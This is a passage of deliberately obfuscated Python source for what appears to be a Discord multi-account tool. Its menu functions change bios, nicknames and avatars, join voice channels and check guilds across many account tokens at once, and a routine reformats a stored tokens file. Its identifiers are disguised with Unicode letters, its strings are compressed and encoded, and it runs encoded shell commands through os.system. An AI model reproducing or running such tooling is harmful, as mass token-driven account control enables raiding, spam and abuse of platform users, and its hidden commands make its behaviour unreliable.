__𝙞𝙢𝘱𝙤𝘳𝘁__(𝗹𝗠𝙄𝗜𝙈𝗹𝘔𝙉𝘐𝘐𝙉𝘔𝙡𝗹𝘐𝙈𝗹𝙈𝘭𝙄𝗠𝗜𝗠𝘐𝗡𝘔𝗜𝙡𝗹𝘭𝗡𝘭[𝘳𝙤𝙪𝙣𝙙(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝘱𝗼𝘳𝙩__(𝗹𝘔𝗜𝘐𝗠𝘭𝙈𝗡𝗜𝘐𝗡𝗠𝘭𝙡𝙄𝘔𝘭𝗠𝙡𝙄𝗠𝘐𝙈𝙄𝘕𝙈𝘐𝘭𝗹𝗹𝙉𝙡[𝘳𝘰𝙪𝗻𝘥(𝗮𝙗𝘴(0.42384525587184685 + 0.9057346184589218j))]).decompress(b'x\xda\xf3+\xb7\xb5\x05\x00\x03X\x01@')).decode(): 𝙨𝘦𝗹𝙛.button_click, __𝙞𝘮𝙥𝘰𝙧𝘁__(𝘭𝙈𝙄𝙄𝙈𝘭𝘔𝗡𝙄𝘐𝙉𝗠𝘭𝙡𝘐𝗠𝗹𝘔𝙡𝘐𝘔𝘐𝙈𝗜𝘕𝗠𝗜𝘭𝙡𝘭𝗡𝙡[𝗿𝘰𝘂𝘯𝗱(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝙥𝘰𝗿𝘁__(𝗹𝘔𝙄𝗜𝙈𝗹𝗠𝘕𝗜𝙄𝙉𝘔𝗹𝘭𝙄𝙈𝗹𝗠𝗹𝙄𝙈𝙄𝗠𝙄𝙉𝙈𝘐𝗹𝘭𝘭𝗡𝘭[𝘳𝙤𝙪𝙣𝙙(𝘢𝙗𝘴(0.7812830954054664 + 0.6241768377901034j))]).decompress(b'x\xda\xf3w\xb4\xb5\x05\x00\x02\xba\x01\x0b')).decode(): 𝘀𝘦𝗹𝗳.accept_rules, __𝗶𝘮𝗽𝘰𝘳𝘁__(𝗹𝙈𝘐𝘐𝘔𝘭𝙈𝗡𝘐𝘐𝘕𝗠𝙡𝙡𝘐𝙈𝘭𝘔𝙡𝘐𝗠𝗜𝘔𝗜𝙉𝘔𝙄𝙡𝙡𝘭𝙉𝗹[𝘳𝗼𝘂𝙣𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝙤𝙧𝙩__(𝗹𝙈𝗜𝘐𝘔𝗹𝙈𝘕𝘐𝗜𝘕𝗠𝘭𝗹𝙄𝗠𝗹𝙈𝘭𝗜𝙈𝘐𝙈𝙄𝘕𝙈𝗜𝘭𝗹𝗹𝗡𝙡[𝘳𝘰𝙪𝘯𝘥(𝘢𝗯𝘴(0.6097916700168039 + 0.7925617447102259j))]).decompress(b'x\xda\xf3\x0f\xb4\xb5\x05\x00\x02\xea\x01\x1b')).decode(): 𝘴𝙚𝗹𝘧.Check_guild, __𝗶𝘮𝙥𝙤𝙧𝘵__(𝘭𝘔𝗜𝘐𝗠𝘭𝙈𝗡𝗜𝗜𝗡𝙈𝙡𝘭𝙄𝘔𝘭𝗠𝗹𝗜𝗠𝗜𝗠𝙄𝙉𝘔𝙄𝙡𝗹𝙡𝗡𝙡[𝗿𝗼𝘂𝗻𝗱(𝘢𝗯𝙨(0.0 + 0j))]).b64decode(__𝙞𝗺𝙥𝘰𝙧𝘵__(𝘭𝙈𝘐𝙄𝙈𝗹𝘔𝘕𝗜𝘐𝘕𝙈𝗹𝗹𝗜𝘔𝙡𝗠𝙡𝘐𝙈𝙄𝘔𝘐𝙉𝘔𝙄𝗹𝙡𝘭𝙉𝙡[𝙧𝗼𝙪𝘯𝗱(𝙖𝘣𝘀(0.005825943410764589 + 0.9999830290476807j))]).decompress(b'x\xda\xf3\rq\xb4\x05\x00\x02\xf3\x01 ')).decode(): 𝘴𝘦𝙡𝗳.Change_bio, __𝗶𝙢𝙥𝘰𝗿𝘵__(𝙡𝙈𝗜𝙄𝗠𝙡𝗠𝙉𝘐𝗜𝘕𝙈𝘭𝘭𝙄𝗠𝗹𝘔𝗹𝗜𝙈𝗜𝗠𝙄𝗡𝗠𝙄𝗹𝙡𝙡𝗡𝘭[𝗿𝙤𝙪𝘯𝘥(𝙖𝘣𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝙥𝙤𝘳𝘁__(𝙡𝙈𝙄𝙄𝗠𝙡𝗠𝗡𝘐𝘐𝙉𝗠𝘭𝙡𝗜𝗠𝙡𝙈𝘭𝘐𝗠𝗜𝙈𝙄𝙉𝘔𝙄𝘭𝙡𝙡𝙉𝙡[𝙧𝗼𝘂𝗻𝗱(𝘢𝘣𝙨(0.4232968371828557 + 0.9059910527323054j))]).decompress(b'x\xda\xf3\rq\xb5\x05\x00\x02\xfb\x01$')).decode(): 𝘴𝗲𝗹𝙛.Oneliner, __𝘪𝗺𝘱𝗼𝙧𝘁__(𝘭𝗠𝙄𝗜𝘔𝗹𝙈𝘕𝙄𝙄𝘕𝘔𝘭𝙡𝘐𝘔𝙡𝗠𝘭𝙄𝙈𝘐𝙈𝙄𝘕𝙈𝙄𝗹𝘭𝘭𝙉𝙡[𝘳𝗼𝙪𝙣𝙙(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝙤𝙧𝘁__(𝗹𝗠𝗜𝙄𝙈𝙡𝙈𝙉𝘐𝙄𝙉𝙈𝙡𝗹𝘐𝘔𝗹𝗠𝘭𝗜𝙈𝘐𝙈𝙄𝘕𝗠𝙄𝗹𝗹𝙡𝙉𝘭[𝗿𝗼𝘶𝗻𝗱(𝘢𝘣𝙨(0.7570999078084997 + 0.6532991118900754j))]).decompress(b'x\xda\xf3\r\xf1\xb4\x05\x00\x03\x03\x01(')).decode(): 𝘴𝘦𝙡𝘧.voicejoiner, __𝙞𝗺𝘱𝙤𝘳𝘁__(𝙡𝗠𝗜𝙄𝙈𝘭𝙈𝘕𝙄𝙄𝘕𝙈𝘭𝗹𝗜𝗠𝙡𝗠𝘭𝙄𝘔𝘐𝘔𝗜𝙉𝘔𝘐𝙡𝘭𝗹𝗡𝘭[𝗿𝙤𝙪𝗻𝘥(𝙖𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝗺𝙥𝘰𝙧𝙩__(𝗹𝗠𝙄𝙄𝙈𝘭𝘔𝘕𝘐𝙄𝗡𝗠𝙡𝗹𝗜𝙈𝗹𝘔𝘭𝘐𝘔𝗜𝗠𝘐𝗡𝗠𝙄𝘭𝙡𝙡𝙉𝗹[𝗿𝙤𝙪𝗻𝗱(𝘢𝗯𝙨(0.5353702608579632 + 0.8446174777903168j))]).decompress(b'x\xda\xf3\r\xf1\xb5\x05\x00\x03\x0b\x01,')).decode(): 𝙨𝘦𝘭𝘧.Nick, __𝗶𝘮𝗽𝗼𝘳𝘵__(𝙡𝘔𝙄𝘐𝗠𝗹𝗠𝙉𝙄𝗜𝘕𝙈𝙡𝘭𝘐𝗠𝙡𝘔𝘭𝘐𝗠𝙄𝙈𝘐𝗡𝗠𝘐𝙡𝗹𝙡𝙉𝗹[𝗿𝙤𝘶𝗻𝘥(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝙤𝙧𝙩__(𝙡𝗠𝗜𝗜𝙈𝗹𝘔𝙉𝘐𝙄𝗡𝘔𝙡𝘭𝙄𝗠𝙡𝗠𝘭𝗜𝗠𝘐𝙈𝙄𝘕𝙈𝗜𝙡𝘭𝙡𝘕𝙡[𝙧𝗼𝘂𝙣𝘥(𝙖𝗯𝘀(0.1873531189573161 + 0.9822926289130779j))]).decompress(b'x\xda\xf3\r\t\xb4\x05\x00\x03\x13\x010')).decode(): 𝘴𝘦𝗹𝗳.thread, __𝘪𝙢𝗽𝗼𝙧𝘁__(𝗹𝙈𝙄𝗜𝘔𝘭𝘔𝗡𝗜𝙄𝗡𝙈𝗹𝘭𝙄𝘔𝙡𝙈𝙡𝙄𝙈𝗜𝗠𝘐𝘕𝘔𝘐𝙡𝗹𝘭𝙉𝗹[𝗿𝘰𝘂𝗻𝙙(𝗮𝘣𝘀(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝗼𝙧𝙩__(𝗹𝙈𝗜𝗜𝘔𝙡𝙈𝙉𝗜𝙄𝘕𝗠𝗹𝙡𝘐𝗠𝘭𝗠𝗹𝘐𝗠𝙄𝘔𝙄𝗡𝘔𝙄𝙡𝗹𝙡𝙉𝙡[𝗿𝘰𝘂𝙣𝗱(𝘢𝗯𝘴(0.7100633630721227 + 0.7041377851121944j))]).decompress(b'x\xda\xf3\r\t\xb5\x05\x00\x03\x1b\x014')).decode(): 𝘴𝙚𝗹𝗳.forms, __𝗶𝙢𝘱𝘰𝙧𝙩__(𝗹𝗠𝙄𝘐𝙈𝘭𝘔𝘕𝘐𝙄𝘕𝙈𝙡𝗹𝗜𝙈𝗹𝙈𝙡𝙄𝘔𝙄𝙈𝗜𝙉𝙈𝙄𝙡𝙡𝙡𝗡𝙡[𝙧𝘰𝙪𝗻𝗱(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝙤𝗿𝘁__(𝗹𝙈𝗜𝘐𝘔𝙡𝘔𝙉𝗜𝙄𝘕𝗠𝘭𝗹𝙄𝗠𝘭𝗠𝙡𝙄𝗠𝘐𝘔𝙄𝗡𝘔𝙄𝘭𝙡𝗹𝘕𝗹[𝙧𝙤𝘶𝗻𝗱(𝙖𝙗𝙨(0.5451684905128232 + 0.8383264978228767j))]).decompress(b'x\xda\xf3\r\x89\xb4\x05\x00\x03#\x018')).decode(): 𝘀𝘦𝗹𝘧.avatar, __𝗶𝗺𝗽𝙤𝘳𝘵__(𝙡𝗠𝙄𝗜𝗠𝘭𝗠𝙉𝙄𝙄𝗡𝗠𝗹𝙡𝙄𝙈𝘭𝘔𝗹𝗜𝙈𝗜𝘔𝘐𝘕𝘔𝙄𝘭𝘭𝗹𝙉𝙡[𝙧𝗼𝘂𝗻𝘥(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝗼𝙧𝙩__(𝘭𝘔𝙄𝘐𝙈𝗹𝙈𝗡𝗜𝙄𝘕𝘔𝙡𝗹𝘐𝘔𝙡𝙈𝗹𝘐𝘔𝘐𝗠𝙄𝘕𝙈𝙄𝘭𝗹𝘭𝙉𝙡[𝗿𝗼𝙪𝗻𝗱(𝗮𝙗𝘴(0.538930640666296 + 0.8423501436760225j))]).decompress(b'x\xda\xf3\xcdr\xb4\x05\x00\x035\x016')).decode(): 𝘀𝗲𝗹𝙛.exit})

    def main_menu(self):
        𝗰𝘰𝘯𝘴𝗼𝘭𝙚.run()
        𝙘𝙝𝙤𝘪𝙘𝗲 = 𝘪𝗻𝙥𝘶𝙩(__𝘪𝘮𝘱𝙤𝙧𝘁__(𝙡𝙈𝗜𝘐𝙈𝙡𝘔𝗡𝗜𝗜𝘕𝘔𝙡𝘭𝗜𝙈𝘭𝙈𝙡𝙄𝘔𝗜𝘔𝙄𝘕𝘔𝙄𝙡𝙡𝗹𝙉𝘭[𝘳𝙤𝙪𝙣𝗱(𝗮𝘣𝙨(0.0 + 0j))]).b64decode(__𝙞𝙢𝗽𝙤𝗿𝙩__(𝙡𝘔𝘐𝗜𝙈𝙡𝙈𝙉𝘐𝗜𝗡𝘔𝗹𝘭𝙄𝗠𝗹𝗠𝘭𝘐𝘔𝘐𝙈𝙄𝗡𝘔𝘐𝗹𝙡𝘭𝘕𝘭[𝙧𝗼𝘶𝙣𝙙(𝘢𝙗𝘴(0.8023546590752574 + 0.5968475526130835j))]).decompress(b'x\xda\xf3tvL\xf7\xf4(\xb1\x0c7.\xb1\x0c\xc8+\xb1\x8c\x88(\xb1L56H\x07\x00^\x99\x07\xa1')).decode().format(𝗿, 𝗹𝗰, 𝙧, 𝘨, 𝘳))
        if 𝗰𝘩𝘰𝘪𝘤𝙚 in 𝘴𝘦𝘭𝗳.options:
            𝘀𝙚𝘭𝘧.options[𝘤𝙝𝙤𝙞𝙘𝘦]()
        else:
            𝙨𝙚𝙡𝘧.main_menu()

    def run(self, func, args):
        𝘵𝙝𝘳𝗲𝗮𝗱𝘀 = []
        𝗰𝘰𝘯𝘴𝙤𝘭𝘦.render_ascii()
        for 𝗮𝘳𝘨 in 𝘢𝗿𝗴𝘴:
            𝙩𝗵𝗿𝙚𝗮𝙙 = 𝘵𝙝𝙧𝗲𝗮𝙙𝙞𝗻𝗴.Thread(target=𝗳𝘶𝙣𝙘, args=𝗮𝗿𝗴)
            𝘵𝗵𝙧𝗲𝗮𝗱𝘀.append(𝘁𝘩𝙧𝗲𝙖𝗱)
            𝙩𝙝𝙧𝗲𝘢𝗱.start()
        for 𝙩𝘩𝙧𝘦𝗮𝗱 in 𝘁𝗵𝙧𝙚𝘢𝗱𝙨:
            𝘵𝘩𝘳𝘦𝘢𝘥.join()
        𝗽𝘳𝗶𝗻𝘵(__𝘪𝙢𝗽𝗼𝙧𝙩__(𝘭𝗠𝘐𝗜𝗠𝘭𝘔𝙉𝙄𝙄𝗡𝗠𝘭𝘭𝘐𝘔𝘭𝗠𝗹𝗜𝘔𝘐𝙈𝗜𝗡𝗠𝗜𝙡𝘭𝗹𝘕𝘭[𝙧𝘰𝘶𝗻𝗱(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝗶𝙢𝙥𝘰𝙧𝘵__(𝙡𝙈𝗜𝘐𝘔𝗹𝘔𝘕𝘐𝙄𝗡𝘔𝙡𝙡𝗜𝘔𝙡𝗠𝘭𝗜𝙈𝙄𝙈𝗜𝗡𝘔𝗜𝘭𝗹𝘭𝙉𝘭[𝙧𝙤𝘶𝗻𝘥(𝙖𝙗𝘴(0.8476023604455083 + 0.530631923810849j))]).decompress(b'x\xdas\xceq\xaa\x8c\x8a\xf0\xab\xf2tw+M\rv*\x8a\x8a\xc8NOq\xb7H\x8f2\xb2H\x8f\xccu\xcbJ\xact2H\x02\xe2D\xf7\xd0\xf4\xa4p\xb7\x82\xa4L\xa7\x92\xa8pSC\x9fL\x93R\x00v5\x14m')).decode())
        𝘰𝘴.system(__𝙞𝙢𝙥𝘰𝘳𝘵__(𝘭𝘔𝘐𝘐𝗠𝘭𝗠𝙉𝙄𝙄𝘕𝙈𝙡𝗹𝙄𝗠𝘭𝙈𝙡𝘐𝙈𝘐𝙈𝘐𝗡𝘔𝙄𝘭𝙡𝘭𝙉𝗹[𝗿𝙤𝘶𝘯𝙙(𝗮𝙗𝙨(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝙤𝗿𝙩__(𝙡𝘔𝗜𝘐𝘔𝗹𝙈𝗡𝘐𝙄𝘕𝗠𝘭𝙡𝘐𝘔𝗹𝘔𝘭𝘐𝗠𝘐𝙈𝗜𝙉𝙈𝗜𝗹𝘭𝘭𝙉𝙡[𝗿𝙤𝘂𝘯𝘥(𝗮𝙗𝘀(0.014070324520547017 + 0.9999010080842435j))]).decompress(b'x\xdaKvw3L6\nM\x0f\xc8t*M\t/\xb7\x05\x00+i\x05R')).decode())
        𝙨𝗲𝗹𝗳.main_menu()

    @𝘄𝙧𝘢𝙥𝗽𝘦𝗿
    def avatar(self):
        𝙤𝙨.system(__𝘪𝗺𝘱𝙤𝙧𝘁__(𝗹𝘔𝗜𝗜𝗠𝙡𝗠𝗡𝘐𝙄𝗡𝗠𝗹𝗹𝘐𝙈𝙡𝘔𝙡𝙄𝙈𝙄𝘔𝗜𝘕𝘔𝙄𝗹𝘭𝙡𝘕𝘭[𝙧𝙤𝘶𝙣𝗱(𝙖𝗯𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝗽𝗼𝘳𝘁__(𝘭𝘔𝗜𝙄𝗠𝙡𝗠𝗡𝘐𝘐𝗡𝗠𝙡𝙡𝙄𝙈𝘭𝗠𝘭𝘐𝘔𝙄𝗠𝙄𝗡𝗠𝗜𝘭𝗹𝗹𝙉𝙡[𝗿𝗼𝘶𝙣𝙙(𝘢𝙗𝘀(0.1650873518131556 + 0.9862789495225575j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x8f\x8c\x88\xcaHqw\xab\xf4t\xf7\xcb\x8f\x0c7\xcd\x8b\x8a\xf0\xb4\x05\x00\x15x\rk')).decode())
        𝗼𝘀.system(__𝗶𝘮𝙥𝙤𝗿𝘁__(𝗹𝘔𝘐𝘐𝗠𝘭𝗠𝘕𝙄𝘐𝗡𝙈𝙡𝘭𝙄𝗠𝘭𝙈𝙡𝗜𝘔𝘐𝗠𝗜𝗡𝘔𝙄𝗹𝘭𝙡𝗡𝘭[𝘳𝘰𝙪𝘯𝗱(𝘢𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝘱𝘰𝙧𝘁__(𝙡𝙈𝗜𝘐𝗠𝘭𝘔𝗡𝘐𝘐𝗡𝙈𝘭𝙡𝗜𝗠𝗹𝘔𝗹𝗜𝗠𝙄𝗠𝙄𝙉𝙈𝙄𝗹𝘭𝘭𝘕𝙡[𝗿𝘰𝘶𝗻𝗱(𝗮𝘣𝘴(0.3233009458933368 + 0.9462962001321118j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
        𝘱𝙧𝙞𝙣𝘵(𝗺𝙚𝙣𝘶)
        for 𝙩𝘰𝘬𝘦𝙣 in 𝘵𝙤𝘬𝙚𝘯𝘀:
            𝘁𝙝𝘳𝙚𝙖𝗱𝘪𝗻𝘨.Thread(target=𝗮𝘃𝙖𝘵𝗮𝗿_𝗰𝗵𝗮𝗻𝙜𝗲𝗿, args=𝘁𝗼𝗸𝙚𝙣).start()
        𝙚𝙭𝘪𝘵 = 𝙞𝘯𝙥𝙪𝙩(__𝗶𝙢𝗽𝘰𝗿𝙩__(𝙡𝗠𝘐𝙄𝙈𝙡𝙈𝗡𝗜𝙄𝗡𝗠𝙡𝗹𝙄𝗠𝘭𝗠𝙡𝙄𝘔𝙄𝘔𝗜𝙉𝙈𝙄𝘭𝙡𝘭𝙉𝙡[𝘳𝙤𝘶𝘯𝗱(𝗮𝗯𝘀(0.0 + 0j))]).b64decode(__𝗶𝙢𝘱𝘰𝘳𝘵__(𝙡𝘔𝘐𝗜𝗠𝗹𝘔𝙉𝙄𝗜𝗡𝘔𝗹𝙡𝘐𝙈𝙡𝗠𝙡𝘐𝗠𝙄𝙈𝗜𝙉𝙈𝘐𝘭𝗹𝙡𝗡𝗹[𝘳𝙤𝘶𝗻𝘥(𝗮𝙗𝙨(0.12960499742038856 + 0.9915657036443228j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        𝗲𝘅𝙞𝙩 = 𝘔𝘦𝘯𝘂().main_menu()
        𝘦𝘹𝘪𝙩()

    @𝘄𝙧𝙖𝙥𝙥𝘦𝙧
    def formater(self):
        𝗼𝘀.system(__𝘪𝗺𝙥𝗼𝘳𝘁__(𝙡𝗠𝘐𝗜𝙈𝗹𝗠𝘕𝗜𝘐𝙉𝗠𝙡𝙡𝘐𝙈𝗹𝗠𝗹𝙄𝘔𝙄𝘔𝗜𝙉𝗠𝘐𝘭𝘭𝘭𝗡𝙡[𝗿𝙤𝘂𝘯𝘥(𝘢𝗯𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝙥𝗼𝗿𝘵__(𝗹𝙈𝘐𝗜𝙈𝙡𝘔𝙉𝗜𝗜𝙉𝘔𝗹𝙡𝘐𝘔𝙡𝘔𝘭𝗜𝙈𝘐𝙈𝗜𝗡𝙈𝙄𝘭𝘭𝙡𝗡𝗹[𝘳𝙤𝙪𝘯𝙙(𝘢𝘣𝘀(0.5728754203025671 + 0.8196424542525583j))]).decompress(b'x\xdaKq\xcf1Hr\x0fM\x0fv\x0f+N\x8c\x08+\xf1t6H\x8f\xca\xb5\xacL\nw3\x88\x8a\xf0\xb4\x05\x00\xb2\r\n\x96')).decode())
        try:
            𝗰𝘭𝙚𝗮𝘯 = []
            𝗼𝘀.system(__𝘪𝘮𝙥𝗼𝙧𝘁__(𝙡𝘔𝘐𝗜𝘔𝗹𝙈𝗡𝙄𝘐𝘕𝙈𝘭𝙡𝘐𝘔𝘭𝙈𝘭𝘐𝙈𝙄𝙈𝘐𝗡𝘔𝙄𝘭𝘭𝙡𝙉𝘭[𝘳𝗼𝘂𝘯𝙙(𝙖𝙗𝘀(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝙤𝘳𝘁__(𝘭𝙈𝗜𝙄𝘔𝙡𝙈𝗡𝘐𝗜𝗡𝘔𝙡𝗹𝙄𝗠𝗹𝗠𝗹𝘐𝗠𝘐𝙈𝙄𝙉𝗠𝙄𝘭𝙡𝘭𝗡𝗹[𝘳𝘰𝘶𝗻𝘥(𝙖𝘣𝘀(0.49866837897429184 + 0.8667928517305343j))]).decompress(b'x\xda\x8b4\xaa\xa8\x02\x00\x03h\x01~')).decode())
            𝘱𝙧𝗶𝙣𝘁(𝘮𝗲𝙣𝘶)
            with 𝙤𝗽𝙚𝘯(__𝙞𝙢𝗽𝘰𝙧𝙩__(𝙡𝘔𝗜𝘐𝘔𝘭𝙈𝙉𝗜𝙄𝙉𝘔𝗹𝘭𝘐𝘔𝘭𝘔𝘭𝘐𝙈𝗜𝘔𝙄𝘕𝙈𝗜𝙡𝙡𝙡𝗡𝘭[𝙧𝙤𝙪𝙣𝗱(𝗮𝗯𝙨(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝗼𝗿𝙩__(𝗹𝘔𝘐𝘐𝗠𝙡𝙈𝗡𝙄𝘐𝘕𝙈𝗹𝗹𝗜𝙈𝙡𝙈𝘭𝙄𝗠𝗜𝘔𝘐𝙉𝙈𝙄𝘭𝘭𝘭𝗡𝗹[𝗿𝘰𝙪𝗻𝙙(𝙖𝙗𝙨(0.7499484293323517 + 0.6614962988119726j))]).decompress(b'x\xda\x8brw3\x88\x0c\xb64H2*\xc9I\xca\xf3-M\xf1\xc80\x00\x00A\x1b\x06w')).decode(), __𝘪𝙢𝗽𝗼𝗿𝘵__(𝘭𝘔𝙄𝙄𝙈𝙡𝘔𝘕𝗜𝘐𝘕𝗠𝙡𝙡𝘐𝗠𝘭𝙈𝘭𝗜𝘔𝙄𝘔𝗜𝙉𝘔𝘐𝗹𝘭𝘭𝙉𝙡[𝗿𝘰𝘶𝗻𝙙(𝘢𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝘰𝘳𝘵__(𝗹𝙈𝗜𝗜𝙈𝙡𝙈𝘕𝘐𝘐𝗡𝗠𝙡𝗹𝙄𝗠𝙡𝗠𝙡𝗜𝘔𝙄𝙈𝗜𝗡𝗠𝙄𝗹𝘭𝘭𝙉𝗹[𝙧𝗼𝘶𝘯𝗱(𝘢𝘣𝙨(0.5166748406780329 + 0.8561817032676704j))]).decompress(b'x\xdaKN\xb7\xb5\x05\x00\x03|\x01E')).decode()) as 𝙛:
                𝘭𝗶𝘯𝙚𝘴 = 𝗳.read().splitlines()
                for 𝙡𝘪𝙣𝗲 in 𝗹𝙞𝘯𝗲𝘴:
                    𝙨𝘱𝗹𝙞𝘵 = 𝗹𝗶𝘯𝗲.split(__𝙞𝙢𝘱𝙤𝗿𝘁__(𝘭𝗠𝙄𝙄𝙈𝙡𝘔𝘕𝙄𝙄𝙉𝘔𝗹𝗹𝘐𝘔𝘭𝘔𝘭𝗜𝗠𝘐𝙈𝘐𝘕𝘔𝙄𝙡𝗹𝗹𝙉𝘭[𝙧𝗼𝘶𝙣𝗱(𝗮𝙗𝘀(0.0 + 0j))]).b64decode(__𝙞𝘮𝘱𝗼𝘳𝘁__(𝗹𝘔𝗜𝘐𝙈𝙡𝗠𝗡𝗜𝗜𝙉𝘔𝗹𝗹𝗜𝗠𝘭𝘔𝗹𝙄𝗠𝘐𝗠𝙄𝘕𝘔𝗜𝙡𝙡𝙡𝙉𝙡[𝘳𝘰𝘶𝘯𝗱(𝙖𝘣𝘀(0.971898430511215 + 0.2354005963667826j))]).decompress(b'x\xda\xf3O\xb7\xb5\x05\x00\x03,\x011')).decode())
                    𝗰𝗹𝘦𝘢𝘯.append(𝙨𝗽𝙡𝘪𝘵[𝗿𝗼𝙪𝙣𝘥(𝙖𝘣𝙨(1.0312019895503295 + 1.7136576252995936j))])
            with 𝘰𝗽𝘦𝙣(__𝙞𝘮𝗽𝗼𝘳𝘁__(𝗹𝙈𝘐𝘐𝙈𝙡𝘔𝙉𝙄𝙄𝙉𝘔𝙡𝘭𝗜𝘔𝘭𝘔𝗹𝗜𝗠𝙄𝗠𝗜𝘕𝗠𝗜𝗹𝘭𝙡𝘕𝗹[𝙧𝗼𝘶𝗻𝗱(𝙖𝙗𝙨(0.0 + 0j))]).b64decode(__𝘪𝘮𝗽𝗼𝙧𝙩__(𝗹𝘔𝘐𝘐𝗠𝗹𝘔𝙉𝘐𝙄𝗡𝙈𝙡𝘭𝗜𝘔𝙡𝗠𝗹𝗜𝗠𝙄𝘔𝘐𝗡𝙈𝙄𝙡𝙡𝗹𝙉𝘭[𝙧𝘰𝙪𝗻𝗱(𝙖𝗯𝘴(0.427248495759763 + 0.9041342394086288j))]).decompress(b'x\xda\x8brw3\x88\x0c\xb64H2*\xc9I\xca\xf3-M\xf1\xc80\x00\x00A\x1b\x06w')).decode(), __𝘪𝗺𝘱𝙤𝙧𝙩__(𝙡𝙈𝘐𝘐𝙈𝘭𝗠𝙉𝗜𝗜𝗡𝘔𝙡𝗹𝘐𝙈𝘭𝗠𝙡𝙄𝙈𝗜𝗠𝙄𝘕𝗠𝗜𝗹𝗹𝘭𝗡𝙡[𝗿𝘰𝘶𝙣𝗱(𝗮𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝘮𝘱𝙤𝘳𝘁__(𝙡𝙈𝗜𝗜𝗠𝗹𝙈𝙉𝗜𝗜𝗡𝘔𝗹𝘭𝙄𝘔𝙡𝗠𝗹𝗜𝗠𝘐𝙈𝘐𝗡𝘔𝙄𝘭𝘭𝘭𝙉𝗹[𝙧𝙤𝘂𝘯𝗱(𝘢𝘣𝘀(0.2391037983188019 + 0.9709940131790318j))]).decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode()) as 𝘧:
                for 𝘵𝙤𝙠𝘦𝗻 in 𝗰𝘭𝙚𝘢𝘯:
                    𝙛.write(__𝗶𝗺𝙥𝗼𝗿𝘵__(𝘭𝙈𝙄𝗜𝙈𝘭𝗠𝙉𝗜𝘐𝘕𝙈𝙡𝙡𝗜𝙈𝙡𝙈𝗹𝘐𝙈𝗜𝘔𝘐𝙉𝗠𝘐𝙡𝘭𝙡𝗡𝘭[𝙧𝘰𝘶𝙣𝙙(𝙖𝙗𝘴(0.0 + 0j))]).b64decode(__𝘪𝙢𝘱𝗼𝘳𝘵__(𝗹𝘔𝘐𝙄𝙈𝘭𝙈𝗡𝘐𝙄𝙉𝘔𝗹𝘭𝙄𝙈𝗹𝘔𝗹𝙄𝙈𝙄𝘔𝘐𝘕𝘔𝗜𝗹𝗹𝗹𝗡𝙡[𝙧𝘰𝙪𝘯𝗱(𝘢𝗯𝘀(0.012882426631904975 + 0.9999170180990388j))]).decompress(b'x\xdaK56\xf0\x06\x00\x02\xdc\x01\x14')).decode().format(𝘁𝙤𝙠𝙚𝘯))
            𝘱𝗿𝘪𝘯𝘁(__𝘪𝘮𝗽𝙤𝘳𝘁__(𝙡𝗠𝘐𝘐𝘔𝙡𝘔𝙉𝘐𝙄𝙉𝘔𝘭𝘭𝗜𝗠𝙡𝗠𝙡𝗜𝗠𝙄𝘔𝘐𝙉𝗠𝘐𝘭𝗹𝘭𝙉𝗹[𝗿𝙤𝙪𝗻𝘥(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝘪𝗺𝗽𝗼𝘳𝘁__(𝙡𝗠𝘐𝙄𝗠𝙡𝘔𝙉𝘐𝙄𝗡𝙈𝘭𝙡𝗜𝘔𝘭𝘔𝙡𝘐𝗠𝗜𝘔𝗜𝙉𝙈𝗜𝙡𝗹𝘭𝗡𝘭[𝙧𝗼𝘶𝘯𝗱(𝙖𝙗𝘀(0.33297516162994034 + 0.942935597873744j))]).decompress(b'x\xdaK56LJ56(J56L\xf1t\x8d*K\xce5\xccH\xf1\x08\xca\x89rv2O\x8b(\xb1\x04\xca\xa5\xa7\xb8[\x16E\x85\x9bV\x01\x009\xa7\x0e*')).decode().format(𝙧, 𝘭𝙘, 𝙧, 𝙡𝙘, 𝘭𝘦𝙣(𝙩𝘰𝗸𝗲𝙣𝘴), 𝘳))
        except:
            pass
        𝗲𝘹𝘪𝘁 = 𝗶𝘯𝘱𝘶𝘁(__𝘪𝗺𝘱𝘰𝙧𝘵__(𝙡𝗠𝘐𝗜𝗠𝗹𝙈𝘕𝙄𝗜𝗡𝗠𝙡𝗹𝘐𝗠𝘭𝘔𝗹𝗜𝘔𝙄𝙈𝘐𝗡𝘔𝘐𝘭𝙡𝙡𝙉𝘭[𝗿𝗼𝘂𝗻𝘥(𝗮𝘣𝘴(0.0 + 0j))]).b64decode(__𝗶𝘮𝙥𝙤𝘳𝙩__(𝗹𝗠𝘐𝙄𝘔𝗹𝙈𝗡𝙄𝗜𝗡𝙈𝙡𝘭𝘐𝗠𝙡𝘔𝘭𝘐𝘔𝗜𝘔𝗜𝙉𝘔𝙄𝗹𝗹𝗹𝘕𝘭[𝗿𝗼𝙪𝘯𝗱(𝙖𝘣𝘀(0.5478087311086131 + 0.8366036063280933j))]).decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        𝙚𝙭𝙞𝘁 = 𝗠𝙚𝗻𝘶().main_menu()
        𝘦𝘅𝗶𝘁()

